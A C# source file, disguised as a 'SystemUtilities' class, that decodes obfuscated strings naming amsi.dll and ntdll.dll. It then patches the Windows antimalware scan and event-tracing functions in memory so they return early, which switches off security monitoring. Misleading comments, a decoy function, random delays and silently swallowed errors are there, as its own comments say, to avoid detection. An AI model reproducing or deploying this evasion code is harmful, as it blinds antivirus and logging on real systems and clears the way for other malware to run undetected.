using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class SystemUtilities
    {
        //memory patches
        static byte[] patch_1_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        static byte[] patch_1_x86 = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
        static byte[] patch_2_x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] patch_2_x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        private static string DecodeStr(string encoded)
        {
            byte[] data = Convert.FromBase64String(encoded);
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= 0x42; // Simple XOR obfuscation
            }
            return System.Text.ASCIIEncoding.ASCII.GetString(data);
        }
        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;
            return is64Bit;
        }

        public static IntPtr GetFirstAddr()
        {
            string dll = DecodeStr("Iy8xK2wmLi4=");
            string func = DecodeStr("Ay8xKxEhIywANyQkJzA=");
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(dll))
                {
                    hAmsi = module.BaseAddress;
                    break;
                }
            }
            return SystemAPIs.GetProcAddress(hAmsi, func);
        }

        public static IntPtr GetSecondAddr()
        {
            string dll = DecodeStr("LDYmLi5sJi4u");
            string func = DecodeStr("BzY1BzQnLDYVMCs2Jw==");
            var modules = Process.GetCurrentProcess().Modules;
            var hETW = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName.Equals(dll))
                {
                    hETW = module.BaseAddress;
                    break;
                }
            }
            return SystemAPIs.GetProcAddress(hETW, func);
    }

        private static void ApplyFirstPatch(byte[] patch)
        {
            string dll = DecodeStr("Iy8xK2wmLi4=");
            string func = DecodeStr("Ay8xKxEhIywANyQkJzA=");
            ModifyMemory(patch, dll, func, GetFirstAddr());
        }

        private static void ApplySecondPatch(byte[] patch)
        {
            string dll = DecodeStr("LDYmLi5sJi4u");
            string func = DecodeStr("BzY1BzQnLDYVMCs2Jw==");
            ModifyMemory(patch, dll, func, GetSecondAddr());
        }

        private static void ModifyMemory(byte[] patch, string library, string function, IntPtr offset)
        {
            try
            {
                // Perform system maintenance operations
                uint newProtect;
                uint oldProtect;
                IntPtr libPtr = SystemAPIs.LoadLibrary(library);
                IntPtr functPtr = SystemAPIs.GetProcAddress(libPtr, function);
                SystemAPIs.VirtualProtect(functPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, functPtr, patch.Length);
                SystemAPIs.VirtualProtect(functPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
                
                // Clean up system resources
                GC.Collect();
            }
            catch (Exception)
            {
                // Silently handle errors to avoid detection
            }
        }

        private static bool CheckSystemIntegrity()
        {
            // Decoy function to obfuscate real purpose
            var rnd = new Random();
            Thread.Sleep(rnd.Next(10, 50));
            return Environment.TickCount % 2 == 0;
        }

        public static void Execute()
        {
            // Add random delay to avoid pattern detection
            Thread.Sleep(new Random().Next(100, 500));
            
            // Perform system integrity check
            CheckSystemIntegrity();
            
            if (is64Bit())
            {
                ApplyFirstPatch(patch_2_x64);
                Thread.Sleep(new Random().Next(50, 150));
                ApplySecondPatch(patch_1_x64);
            }
            else
            {
                ApplyFirstPatch(patch_2_x86);
                Thread.Sleep(new Random().Next(50, 150));
                ApplySecondPatch(patch_1_x86);
            }
        }
 }

class SystemAPIs
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwsize, uint flNewProtect, out uint lpflOldProtect); 
}
